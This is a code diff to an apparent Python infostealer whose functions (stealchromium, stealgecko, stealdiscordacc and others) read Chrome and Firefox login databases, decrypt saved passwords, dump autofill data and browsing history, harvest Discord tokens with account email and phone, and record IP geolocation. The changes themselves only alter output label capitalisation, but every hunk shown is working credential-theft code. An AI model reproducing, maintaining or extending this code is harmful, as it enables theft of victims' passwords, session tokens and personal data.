@@ -330,13 +330,13 @@ def systeminfo():
     ip_lines = []
     if ip_info.status_code in [200, 201, 204]:
         ipinf = ip_info.json()
-        ip_lines.append(f'IP ADDRESS: {ipinf.get("ip", "None")}')
-        ip_lines.append(f'HOSTNAME: {ipinf.get("hostname", "None")}')
-        ip_lines.append(f'LOCATION: {ipinf.get("city", "None")}, {ipinf.get("region", "None")}, {ipinf.get("country", "None")}')
-        ip_lines.append(f'COORDINATES: {ipinf.get("loc", "None")}')
-        ip_lines.append(f'POSTAL: {ipinf.get("postal", "None")}')
-        ip_lines.append(f'ORGANIZATION: {ipinf.get("org", "None")}')
-        ip_lines.append(f'TIMEZONE: {ipinf.get("timezone", "None")}')
+        ip_lines.append(f'IP Address: {ipinf.get("ip", "None")}')
+        ip_lines.append(f'Hostname: {ipinf.get("hostname", "None")}')
+        ip_lines.append(f'Location: {ipinf.get("city", "None")}, {ipinf.get("region", "None")}, {ipinf.get("country", "None")}')
+        ip_lines.append(f'Coordinates: {ipinf.get("loc", "None")}')
+        ip_lines.append(f'Postal: {ipinf.get("postal", "None")}')
+        ip_lines.append(f'Organization: {ipinf.get("org", "None")}')
+        ip_lines.append(f'Timezone: {ipinf.get("timezone", "None")}')
         
     sys_lines.append(information)
     sys_lines.append('=======================================')
@@ -445,7 +445,7 @@ def stealchromium():
                     cur.execute("SELECT name, value FROM autofill")
                     try:
                         for autofillname, val in cur.fetchall():
-                            line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
+                            line = f"Name: {autofillname} \nValue: {val}\n---------------------------------\n"
                             write(autofilloutput, line)
                             autofill_count += 1
                     except Exception as e:
@@ -483,7 +483,7 @@ def stealchromium():
                     try:
                         for host, c0name, value in cur.fetchall():
                             if c0name and value:
-                               line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypt_password(value, master_key)}\n---------------------------------\n"
+                               line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypt_password(value, master_key)}\n---------------------------------\n"
                                write(passwordoutput, line)
                                password_count += 1
                     except Exception as e:
@@ -500,7 +500,7 @@ def stealchromium():
                     cur.execute("SELECT url, title, visit_count FROM urls")
                     try:
                         for w3url, w3name, w3visit in cur.fetchall():
-                            line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
+                            line = f"Name: {w3name}\nURL: {w3url}\nVisits: {w3visit}\n---------------------------------\n"
                             write(historyoutput, line)
                             browsing_history += 1
                     except Exception as e:
@@ -583,7 +583,7 @@ def stealchromiumv20():
                             if c0name and value:
                                 decrypted = decrypt_v20_password(value, master_key)
                                 if decrypted is not None:
-                                    line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypted}\n---------------------------------\n"
+                                    line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypted}\n---------------------------------\n"
                                     write(passwordoutput, line)
                                     password_count += 1
                     except Exception as e:
@@ -665,7 +665,7 @@ def stealgecko():
                                Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
                                Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
                                if Cusername and Cpassword:
-                                   line = f"URL: {host}\nUSERNAME: {Cusername}\nPASSWORD: {Cpassword}\n---------------------------------\n"
+                                   line = f"URL: {host}\nUsername: {Cusername}\nPassword: {Cpassword}\n---------------------------------\n"
                                    write(passwordoutput, line)
                                    password_count += 1
                        removefile(tmpdir)
@@ -681,7 +681,7 @@ def stealgecko():
                         cur.execute("SELECT url, title, visit_count FROM moz_places")
                         try:
                             for w3url, w3name, w3visit in cur.fetchall():
-                                line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
+                                line = f"Name: {w3name}\nURL: {w3url}\nVisits: {w3visit}\n---------------------------------\n"
                                 write(historyoutput, line)
                                 browsing_history += 1
                         except Exception as e:
@@ -701,7 +701,7 @@ def stealgecko():
                         cur.execute("SELECT fieldname, value FROM moz_formhistory")
                         try:
                             for autofillname, val in cur.fetchall():
-                                line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
+                                line = f"Name: {autofillname} \nValue: {val}\n---------------------------------\n"
                                 write(autofilloutput, line)
                                 autofill_count += 1
                         except Exception as e:
@@ -915,16 +915,16 @@ def stealdiscordacc():
                 locale = userinfo.get('locale')
                 pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}?size=1024" if avatar else "None"
 
-                line_ = f"""TOKEN: {token}
-USER ID: {user_id}
-ACCOUNT CREATED: {accountdate(user_id)}
-USERNAME: {username}
-EMAIL: {email}
-PHONE NUMBER: {phone}
-BIO: {bio}
+                line_ = f"""Token: {token}
+User ID: {user_id}
+Account Created: {accountdate(user_id)}
+Username: {username}
+E-mail: {email}
+Phone Number: {phone}
+Bio: {bio}
 PFP: {pfp}
 MFA: {mfa}
-NITRO: {nitro}
+Nitro: {nitro}
 =====================================
 """
                 write(discordoutput, line_)
